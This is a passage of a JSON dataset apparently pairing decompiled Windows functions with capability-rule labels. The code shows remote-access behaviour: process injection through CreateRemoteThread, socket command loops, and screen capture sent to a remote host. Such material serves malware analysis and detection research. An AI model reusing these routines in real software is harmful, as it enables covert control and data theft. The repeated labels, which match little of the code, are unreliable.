            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00474208(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    *0x49a1ac = sub.kernel32.dll_LoadLibraryA(0x4742b4);\n    if (*0x49a1ac != 0) {\n        *0x49a198 = sub.kernel32.dll_GetProcAddress_1(*0x49a1ac, 0x4742c0);\n        if (*0x49a198 != 0) {\n            *0x49a19c = sub.kernel32.dll_GetProcAddress_1(*0x49a1ac, 0x4742d0);\n            if (*0x49a19c != 0) {\n                *0x49a1a0 = sub.kernel32.dll_GetProcAddress_1(*0x49a1ac, 0x4742e0);\n                if (*0x49a1a0 != 0) {\n                    *0x49a1a4 = sub.kernel32.dll_GetProcAddress_1(*0x49a1ac, 0x4742f4);\n                    if (*0x49a1a4 != 0) {\n                        *0x49a1a8 = sub.kernel32.dll_GetProcAddress_1(*0x49a1ac, 0x474308);\n                        if (*0x49a1a8 != 0) {\n                            uVar1 = 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 328
    },
    "00474324": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00474324(void)\n\n{\n    if (*0x49a1ac != 0) {\n        sub.kernel32.dll_FreeLibrary_1(*0x49a1ac);\n    }\n    return;\n}\n",
        "token_count": 48
    },
    "00474e20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00474e20(uint arg_8h, uint nSize)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint lpNumberOfBytesRead;\n    uint lpBuffer;\n    \n    fcn.00474df0();\n    fcn.00474d34();\n    fcn.00474df0();\n    uVar1 = sub.kernel32.dll_CreateRemoteThread();\n    if (arg_8h != '\\0') {\n        sub.kernel32.dll_WaitForSingleObject(uVar1, 0xffffffff);\n        sub.kernel32.dll_ReadProcessMemory();\n    }\n    return uVar1;\n}\n",
        "token_count": 134
    },
    "0047ed68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047ed68(void)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x47edb2;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x49a1b0 = *0x49a1b0 + 1;\n    if (*0x49a1b0 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**0x4947fc == 0) {\n            sub.wsock32.dll_WSACleanup();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (**0x494808 != 0) {\n            fcn.0040f944();\n        }\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 220
    },
    "0047f1d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047f1d4(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    uint uVar8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x47f42b;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (param_2 != NULL) {\n        puStack40 = 0x47f205;\n        iVar6 = (***param_2)();\n        if (iVar6 >> 0x20 == 0) {\n            if (iVar6 != 0) {\ncode_r0x0047f21a:\n                puStack40 = 0x47f225;\n                fcn.004055c8();\n                puStack40 = 0x47f237;\n                fcn.00405a84();\n                puStack40 = 0x47f243;\n                puVar1 = fcn.00404620();\n                uVar5 = 1;\n                uStack44 = 0x47f40e;\n                uStack48 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd0;\n                puStack40 = &stack0xfffffffc;\n                fcn.0041b734(0, 0);\n                fcn.0041beb4();\n                fcn.00467850();\n                uVar8 = 0;\n                fcn.0041b734(0, 0);\n                fcn.00405974();\n                if (uVar5) {\n                    uVar7 = (***puVar1)();\n                    uVar8 = uVar7;\n                    iVar2 = fcn.00465a0c(uVar7);\n                    **0x494ccc = iVar2;\n                    uVar5 = **0x494ccc == 0;\n                    if (!uVar5) {\n                        pcVar3 = fcn.00465df8();\n                        **0x494b1c = pcVar3;\n                        uVar5 = pcVar3 == NULL;\n                        if (!uVar5) {\n                            uVar4 = fcn.004059dc(**0x494b30);\n                            (***0x494b1c)(*(in_EAX + 0x48), **0x4949d4, uVar4);\n                        }\n                    }\n                }\n                fcn.00405974();\n                if (uVar5) {\n                    uVar7 = (***puVar1)();\n                    uVar8 = uVar7;\n                    iVar2 = fcn.00465a0c(uVar7);\n                    **0x494ccc = iVar2;\n                    if (**0x494ccc != 0) {\n                        pcVar3 = fcn.00465df8();\n                        **0x494bf4 = pcVar3;\n                        uVar4 = fcn.00465df8();\n                        **0x494c84 = uVar4;\n                        uVar4 = fcn.00465df8();\n                        **0x494c54 = uVar4;\n                        uVar4 = fcn.00465df8();\n                        **0x494ca0 = uVar4;\n                        uVar4 = fcn.00465df8();\n                        **0x494974 = uVar4;\n                        if (**0x494bf4 != NULL) {\n                            uVar4 = fcn.004059dc();\n                            (***0x494bf4)(**0x494af0, uVar4);\n                        }\n                    }\n                }\n                *in_FS_OFFSET = uVar8;\n                uVar8 = 0x47f415;\n                if (puVar1 != NULL) {\n                    fcn.0040f944(0x47f415);\n                }\n                if (param_2 != NULL) {\n                    fcn.0040f944(uVar8);\n                }\n                return;\n            }\n        }\n        else if (0xffffffff < iVar6) goto code_r0x0047f21a;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x47f432;\n    uStack32 = 0x47f42a;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1020
    },
    "0047f4e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0047f4e0(void)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *unaff_ESI;\n    uint32_t unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStackY160;\n    uint uStackY156;\n    int32_t iStack64;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uchar auStack24 [3];\n    int32_t *var_11h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    iVar2 = 0x433;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    uStack32 = 0x47f930;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    bVar1 = false;\n    uVar3 = 1;\n    _auStack24 = unaff_EDI;\n    unique0x10000308 = unaff_ESI;\n    var_ch = in_EAX;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        _auStack24 = CONCAT13(1, auStack24);\n    }\n    else {\n        _auStack24 = _auStack24 & 0xffffff;\n    }\n    var_4h = sub.wsock32.dll_socket();\n    if (var_4h != -1) {\n        sub.wsock32.dll_htons();\n        iVar2 = sub.wsock32.dll_inet_addr();\n        if (iVar2 == -1) {\n            iStack64 = **0x494b30;\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            if (iVar2 == 0) goto code_r0x0047f8cf;\n        }\n        sub.wsock32.dll_connect();\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            fcn.00409d70();\n            fcn.004058e0();\n            fcn.00475ecc();\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                fcn.00403af4();\n                sub.wsock32.dll_recv();\n                fcn.00405e3c();\n                fcn.00409bd0();\n                fcn.004057d4();\n                iVar2 = fcn.00409edc();\n                *(var_ch + 0x50) = iVar2;\n                *(var_ch + 0x54) = iVar2 >> 0x1f;\n                uStackY156 = 0x47f6bc;\n                fcn.0047f4c0(&stack0xfffffffc);\n                if (var_11h == '\\0') {\n                    uStackY156 = 0x47f749;\n                    iStackY160 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffff60;\n                    fcn.0040a68c();\n                    fcn.0048adcc();\n                    fcn.00405864();\n                    fcn.00403770();\n                    **0x494bd4 = 1;\n                    fcn.00403e84();\n                    fcn.0040305c();\n                    bVar1 = true;\n                    *in_FS_OFFSET = iStackY160;\n                    while (*(var_ch + 0xd) == '\\0') {\n                        fcn.00403af4();\n                        iVar2 = sub.wsock32.dll_recv();\n                        uVar3 = iVar2 == 0;\n                        if (iVar2 < 1) break;\n                        fcn.00405e3c();\n                        fcn.00409bd0();\n                        fcn.004057d4();\n                        fcn.00405a44();\n                        fcn.00405974();\n                        if (uVar3) break;\n                        fcn.004038f8(0);\n                        fcn.0040305c();\n                        fcn.0047f4c0(&stack0xfffffffc);\n                    }\n                }\n                else {\n                    *NULL = fcn.00404620();\n                    while (*(var_ch + 0xd) == '\\0') {\n                        fcn.00403af4();\n                        iVar2 = sub.wsock32.dll_recv();\n                        if (iVar2 < 1) break;\n                        (**(*stack0xffffffec + 0x10))();\n                        fcn.0047f4c0(&stack0xfffffffc);\n                    }\n                }\n            }\n        }\n        if (var_11h == '\\0') {\n            if (bVar1) {\n                fcn.00403918();\n                fcn.0040305c();\n            }\n            fcn.0047ee3c();\n        }\n        else {\n            fcn.0047f1d4();\n        }\n        sub.wsock32.dll_shutdown();\n        iStack64 = var_4h;\n        sub.wsock32.dll_closesocket();\n        fcn.0041ff18();\n    }\ncode_r0x0047f8cf:\n    *in_FS_OFFSET = iStack64;\n    fcn.00405530();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1251
    },
    "0047fa8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047fa8c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t *in_FS_OFFSET;\n    ushort uStackY8240;\n    ushort uStackY8238;\n    int32_t iStackY8236;\n    uchar auStackY8224 [3836];\n    uint uStackY4388;\n    uint uStackY4384;\n    uint uStackY4380;\n    uint uStackY4376;\n    uint uStackY4372;\n    int32_t iStack4252;\n    uint uStack4248;\n    uchar *puStack4244;\n    uchar *puStack4236;\n    uint uStack4232;\n    uint uStack4228;\n    uchar *puStack4220;\n    uint uStack4216;\n    uint uStack4212;\n    int32_t iStack4208;\n    uchar *puStack4204;\n    uint uStack4200;\n    int32_t iStack4196;\n    int32_t iStack4192;\n    uint32_t uStack4188;\n    uint uStack4184;\n    uint uStack4180;\n    uint uStack4176;\n    int32_t iStack4172;\n    uint uStack4168;\n    uchar *puStack4164;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack4164 = &stack0xfffffffc;\n    iVar2 = 2;\n    do {\n        iVar1 = iVar2;\n        iVar2 = iVar1 + -1;\n    } while (iVar1 + -1 != 0);\n    uStack4168 = 0x47fd80;\n    iStack4172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefb4;\n    uStack4176 = 0;\n    uStack4180 = 1;\n    uStack4184 = 2;\n    uStack4188 = 0x47fad0;\n    var_4h = iVar1;\n    var_4h = sub.wsock32.dll_socket();\n    if (var_4h != -1) {\n        uStackY8240 = 2;\n        uStack4188 = **0x4949d4;\n        iStack4192 = 0x47faf4;\n        uStackY8238 = sub.wsock32.dll_htons();\n        iStack4192 = **0x494b30;\n        iStack4196 = 0x47fb08;\n        iStackY8236 = sub.wsock32.dll_inet_addr();\n        if (iStackY8236 == -1) {\n            iStack4196 = **0x494b30;\n            uStack4200 = 0x47fb20;\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            if (iVar2 == 0) goto code_r0x0047fd32;\n            iStackY8236 = ***(iVar2 + 0xc);\n        }\n        uStack4200 = 0x10;\n        puStack4204 = &stack0xffffdfd0;\n        iStack4208 = var_4h;\n        uStack4212 = 0x47fb47;\n        sub.wsock32.dll_connect();\n        uStack4212 = 0;\n        uStack4216 = 0x2000;\n        puStack4220 = &stack0xffffdfe0;\n        iStack4196 = var_4h;\n        uStack4228 = 0x47fb5e;\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            uStack4228 = 0x47fb73;\n            fcn.00409d70();\n            uStack4228 = 0x47fb89;\n            fcn.00405864();\n            uStack4228 = 0x47fb97;\n            fcn.00475ecc();\n            uStack4228 = 0;\n            uStack4232 = 0x2000;\n            puStack4236 = &stack0xffffdfe0;\n            iStack4196 = var_4h;\n            puStack4244 = 0x47fbae;\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                puStack4244 = 0x47fbc1;\n                var_8h = fcn.00404620();\n                puStack4244 = 0x47fbd0;\n                piVar3 = fcn.00404620();\n                uStack4248 = 0x47fd2b;\n                iStack4252 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffef64;\n                puStack4244 = &stack0xfffffffc;\n                uVar4 = sub.user32.dll_GetDC();\n                uVar5 = sub.gdi32.dll_CreateCompatibleDC();\n                sub.gdi32.dll_GetDeviceCaps();\n                sub.gdi32.dll_GetDeviceCaps();\n                uVar6 = sub.gdi32.dll_CreateCompatibleBitmap();\n                sub.gdi32.dll_SelectObject();\n                sub.gdi32.dll_GetDeviceCaps();\n                sub.gdi32.dll_GetDeviceCaps();\n                sub.gdi32.dll_BitBlt();\n                fcn.0045ff90(&fcn.0047fa8c::var_8h);\n                fcn.0041b734(0, 0);\n                fcn.00467718();\n                iVar2 = 0;\n                uStackY4372 = 0x47fc94;\n                fcn.0041b734(0, 0);\n                while( true ) {\n                    uStackY4372 = 0x47fca6;\n                    fcn.00403af4();\n                    uStackY4372 = 0x47fcb9;\n                    iVar7 = (**(*piVar3 + 0xc))();\n                    if (iVar7 == 0) break;\n                    sub.wsock32.dll_send();\n                    uStackY4372 = 0x47fce9;\n                    iVar2 = var_4h;\n                    sub.wsock32.dll_recv();\n                    if ((iVar7 == 0) || (*(iVar1 + 0xd) != '\\0')) break;\n                }\n                *in_FS_OFFSET = iVar2;\n                uStackY4372 = 0x47fd0d;\n                sub.gdi32.dll_SelectObject();\n                uStackY4376 = 0x47fd16;\n                uStackY4372 = uVar5;\n                sub.gdi32.dll_DeleteObject();\n                uStackY4380 = 0x47fd1f;\n                uStackY4376 = uVar6;\n                sub.gdi32.dll_DeleteObject();\n                uStackY4384 = 0;\n                uStackY4388 = 0x47fd2a;\n                uStackY4380 = uVar4;\n                sub.user32.dll_ReleaseDC();\n                return;\n            }\n        }\n    }\ncode_r0x0047fd32:\n    if (var_8h != 0) {\n        uStack4200 = 0x47fd40;\n        fcn.0040f944();\n    }\n    if (var_ch != 0) {\n        uStack4200 = 0x47fd4e;\n        fcn.0040f944();\n    }\n    uStack4200 = 2;\n    puStack4204 = var_4h;\n    iStack4208 = 0x47fd59;\n    sub.wsock32.dll_shutdown();\n    iStack4208 = var_4h;\n    uStack4212 = 0x47fd62;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = iStack4208;\n    uStack4200 = 0x47fd87;\n    puStack4204 = 0x47fd7f;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1772
    },
    "0047fe20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047fe20(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack1180;\n    int32_t iStack1176;\n    uchar *puStack1172;\n    int32_t iStack1116;\n    int32_t iStack1092;\n    uint uStack1088;\n    uchar *puStack1084;\n    uint var_428h;\n    uint var_424h;\n    uint var_420h;\n    uint name;\n    uint var_40ch;\n    int32_t *var_ch;\n    int32_t s;\n    uint var_4h;\n    \n    puStack1084 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack1088 = 0x480053;\n    iStack1092 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbbc;\n    puVar1 = &stack0xfffffffc;\n    if ((*(in_EAX + 0x44) == 0) && (s = sub.wsock32.dll_socket(),  puVar1 = puStack1084,  s != -1)) {\n        sub.wsock32.dll_htons();\n        iVar2 = sub.wsock32.dll_inet_addr();\n        if (iVar2 == -1) {\n            iStack1116 = **0x494b30;\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            puVar1 = puStack1084;\n            if (iVar2 == 0) goto code_r0x0048002d;\n        }\n        sub.wsock32.dll_connect();\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            fcn.00409d70();\n            fcn.00405864();\n            fcn.00475ecc();\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                var_ch = fcn.00404620();\n                puStack1172 = 0x47ff62;\n                fcn.0041b734(0, 0);\n                iStack1176 = 0x480012;\n                iStack1180 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffb64;\n                puStack1172 = &stack0xfffffffc;\n                while( true ) {\n                    fcn.00403af4();\n                    iVar2 = sub.wsock32.dll_recv(s, &fcn.0047fe20::var_40ch, 0x400, 0);\n                    if (iVar2 < 1) break;\n                    (**(*var_ch + 0x10))();\n                    puStack1172 = 0x400;\n                    iStack1176 = &fcn.0047fe20::var_40ch + 1;\n                    iStack1180 = s;\n                    sub.wsock32.dll_send();\n                }\n                iVar2 = 0;\n                fcn.0041b734(0, 0);\n                fcn.0048cdec();\n                fcn.004616b4();\n                fcn.004760a4();\n                fcn.0040f944();\n                *in_FS_OFFSET = iVar2;\n                fcn.00404650(0x480019);\n                return;\n            }\n        }\n        sub.wsock32.dll_shutdown();\n        iStack1116 = s;\n        sub.wsock32.dll_closesocket();\n        puVar1 = puStack1084;\n    }\ncode_r0x0048002d:\n    puStack1084 = puVar1;\n    *in_FS_OFFSET = iStack1116;\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 815
    },
    "004801fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004805bf)\n\nvoid fcn.004801fc(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_FS_OFFSET;\n    int64_t iVar5;\n    uchar auStackY8220 [3608];\n    uint uStackY4612;\n    uchar *puStackY4604;\n    uint uStackY4600;\n    uint uStackY4596;\n    uint uStackY4592;\n    uint uStackY4588;\n    uint uStackY4584;\n    uint *puStack4540;\n    int32_t iStack4516;\n    uint *puStack4512;\n    uint *arg_8h;\n    uchar *puStack4472;\n    uint uStack4468;\n    uchar *puStack4464;\n    uchar *puStack4456;\n    uint uStack4452;\n    uint uStack4448;\n    uint uStack4444;\n    int32_t var_18h;\n    uint var_14h;\n    uint s;\n    int32_t len;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = 2;\n    do {\n        var_8h = iVar3;\n        iVar3 = var_8h + -1;\n    } while (var_8h + -1 != 0);\n    var_4h = 0;\n    puStack4512 = 0x48061c;\n    iStack4516 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffee5c;\n    if ((*(var_8h + 0x48) == 0) && (puVar2 = sub.wsock32.dll_socket(),  puVar2 != 0xffffffff)) {\n        sub.wsock32.dll_htons();\n        iVar3 = sub.wsock32.dll_inet_addr();\n        if (iVar3 == -1) {\n            puStack4540 = **0x494b30;\n            iVar3 = sub.wsock32.dll_gethostbyname();\n            if (iVar3 == 0) goto code_r0x004805f6;\n        }\n        sub.wsock32.dll_connect();\n        iVar3 = sub.wsock32.dll_recv();\n        if (iVar3 != -1) {\n            uVar4 = fcn.00480690();\n            uStackY4584 = 0x480318;\n            fcn.00409e5c(uVar4);\n            uStackY4584 = 0;\n            uStackY4588 = 0x48064c;\n            uStackY4592 = 0x480334;\n            fcn.00409d70();\n            uStackY4592 = 0;\n            uStackY4596 = 0x48034a;\n            fcn.004058e0();\n            uStackY4596 = 0x480358;\n            fcn.00475ecc();\n            uStackY4596 = 0;\n            uStackY4600 = 0x2000;\n            puStackY4604 = &stack0xffffdfe4;\n            uStackY4612 = 0x48036f;\n            iVar3 = sub.wsock32.dll_recv();\n            if (iVar3 != -1) {\n                uStackY4612 = 0x480381;\n                var_18h = (**(**(var_8h + 0x40) + 0x14))();\n                if (-1 < var_18h + -1) {\n                    while( true ) {\n                        iStack4516 = 0x4803a6;\n                        (**(**(var_8h + 0x40) + 0xc))();\n                        uVar4 = fcn.004800dc();\n                        uStack4444 = 0x4803cb;\n                        fcn.00409e5c(uVar4);\n                        uStack4444 = 0;\n                        uStack4448 = 0x4803e1;\n                        fcn.004058e0();\n                        uStack4448 = 0x4803ef;\n                        fcn.00475f68();\n                        uStack4448 = 0;\n                        uStack4452 = 0x2000;\n                        puStack4456 = &stack0xffffdfe4;\n                        puStack4464 = 0x480406;\n                        puStack4512 = puVar2;\n                        iVar3 = sub.wsock32.dll_recv();\n                        if (iVar3 == -1) break;\n                        puStack4464 = 0x480415;\n                        cVar1 = fcn.0040a26c();\n                        if (cVar1 == '\\0') {\ncode_r0x00480432:\n                            puStack4464 = 0x48043f;\n                            fcn.00475f68();\n                            puStack4464 = NULL;\n                            uStack4468 = 0x2000;\n                            puStack4472 = &stack0xffffdfe4;\n                            puStack4512 = puVar2;\n                            iVar3 = sub.wsock32.dll_recv();\n                        }\n                        else {\n                            puStack4464 = 0x480424;\n                            iVar5 = fcn.004800dc();\n                            if (iVar5 >> 0x20 == 0) {\n                                if (iVar5 == 0) goto code_r0x00480432;\n                            }\n                            else if (iVar5 < 0x100000000) goto code_r0x00480432;\n                            uStack4468 = 0x480523;\n                            puStack4472 = *in_FS_OFFSET;\n                            *in_FS_OFFSET = &stack0xffffee88;\n                            puStack4464 = &stack0xfffffffc;\n                            fcn.00403770();\n                            **0x494bd4 = 0;\n                            fcn.00403e68();\n                            while( true ) {\n                                fcn.00403af4();\n                                arg_8h = &fcn.004801fc::len;\n                                fcn.004038d8(arg_8h);\n                                if ((len < 1) || (arg_8h = puVar2,  iVar3 = sub.wsock32.dll_send(),  iVar3 == -1))\n                                break;\n                                puStack4512 = 0x4804fa;\n                                arg_8h = puVar2;\n                                iVar3 = sub.wsock32.dll_recv();\n                                if ((iVar3 == -1) || (len == 0)) break;\n                            }\n                            puStack4512 = 0x480512;\n                            fcn.00403918();\n                            puStack4512 = 0x480517;\n                            fcn.0040305c();\n                            *in_FS_OFFSET = arg_8h;\n                            fcn.00475f68();\n                            iStack4516 = 0x480588;\n                            puStack4512 = puVar2;\n                            iVar3 = sub.wsock32.dll_recv();\n                        }\n                        if ((iVar3 == -1) || (var_18h = var_18h + -1,  var_18h == 0)) break;\n                    }\n                }\n                iStack4516 = 0x4805a4;\n                fcn.00475f68();\n                iStack4516 = 0;\n                sub.wsock32.dll_recv();\n            }\n        }\n        sub.wsock32.dll_shutdown();\n        sub.wsock32.dll_closesocket();\n        fcn.0040f944();\n        fcn.0041ff18();\n        puStack4540 = puVar2;\n    }\ncode_r0x004805f6:\n    *in_FS_OFFSET = puStack4540;\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1669
    },
    "00480880": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00480880(void)\n\n{\n    bool bVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uchar uVar5;\n    uchar auStackY8212 [8100];\n    uint uStackY112;\n    uchar *puStackY104;\n    uint uStackY100;\n    uint uStackY96;\n    int32_t iStack64;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint s;\n    \n    puStack32 = &stack0xfffffffc;\n    iVar4 = 0x431;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    uStack36 = 0x480c86;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    bVar1 = false;\n    puVar2 = &stack0xfffffffc;\n    if ((*(in_EAX + 0x48) == 0) && (iVar4 = sub.wsock32.dll_socket(),  puVar2 = puStack32,  iVar4 != -1)) {\n        sub.wsock32.dll_htons();\n        iVar3 = sub.wsock32.dll_inet_addr();\n        if (iVar3 == -1) {\n            iStack64 = **0x494b30;\n            iVar3 = sub.wsock32.dll_gethostbyname();\n            puVar2 = puStack32;\n            if (iVar3 == 0) goto code_r0x00480c3b;\n        }\n        sub.wsock32.dll_connect();\n        uStackY96 = 0x480948;\n        iVar3 = sub.wsock32.dll_recv();\n        if (iVar3 != -1) {\n            uStackY96 = 0x48095d;\n            fcn.00409d70();\n            uStackY96 = 0x480973;\n            fcn.00405864();\n            uStackY96 = 0x480981;\n            fcn.00475ecc();\n            uStackY96 = 0;\n            uStackY100 = 0x2000;\n            puStackY104 = &stack0xffffdfec;\n            uStackY112 = 0x480998;\n            iVar3 = sub.wsock32.dll_recv();\n            if (iVar3 != -1) {\n                while (*(in_EAX + 0xd) == '\\0') {\n                    fcn.00403af4();\n                    iVar3 = sub.wsock32.dll_recv();\n                    uVar5 = iVar3 == 0;\n                    if ((iVar3 < 1) && (uVar5 = *(in_EAX + 0x40) == '\\0',  uVar5)) {\n                        fcn.0041ff18();\n                        break;\n                    }\n                    fcn.00405e3c();\n                    fcn.00409bd0();\n                    fcn.004057d4();\n                    fcn.00405a44();\n                    fcn.00405974();\n                    if (uVar5) {\n                        fcn.00405a84();\n                        fcn.00405b28();\n                        fcn.00405a44();\n                        fcn.00405b28();\n                        fcn.00405a84();\n                        fcn.004055c8();\n                        fcn.00405864();\n                        fcn.00403770();\n                        **0x494bd4 = 1;\n                        fcn.00403e84();\n                        fcn.0040305c();\n                        bVar1 = true;\n                        fcn.00480860(&stack0xfffffffc);\n                    }\n                    else {\n                        fcn.00405a44();\n                        fcn.00405974();\n                        if (uVar5) {\n                            fcn.00405a84();\n                            if (bVar1) {\n                                fcn.00403918();\n                                fcn.0040305c();\n                            }\n                            bVar1 = false;\n                            fcn.00480860(&stack0xfffffffc);\n                        }\n                        else {\n                            fcn.00405a44();\n                            fcn.00405974();\n                            if (uVar5) {\n                                *(in_EAX + 0x40) = 1;\n                                sub.wsock32.dll_shutdown();\n                                uStackY96 = 0x480b8e;\n                                sub.wsock32.dll_closesocket();\n                                uStackY96 = 0x480b95;\n                                fcn.0041ff18();\n                                break;\n                            }\n                            fcn.00405a44();\n                            fcn.00405974();\n                            if (uVar5) {\n                                if (bVar1) {\n                                    fcn.00403918();\n                                    fcn.0040305c();\n                                }\n                                bVar1 = false;\n                                fcn.00480860(&stack0xfffffffc);\n                            }\n                            else {\n                                fcn.004038f8(0);\n                                